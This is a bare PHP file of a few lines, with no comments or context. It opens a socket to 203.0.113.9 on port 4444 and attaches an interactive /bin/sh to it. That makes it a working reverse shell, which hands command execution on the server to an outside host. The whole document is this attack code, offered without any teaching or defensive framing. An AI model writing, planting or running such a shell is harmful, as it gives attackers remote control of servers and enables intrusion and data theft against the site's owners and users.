<?php

$sock = fsockopen('203.0.113.9', 4444);
$proc = proc_open('/bin/sh -i', [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
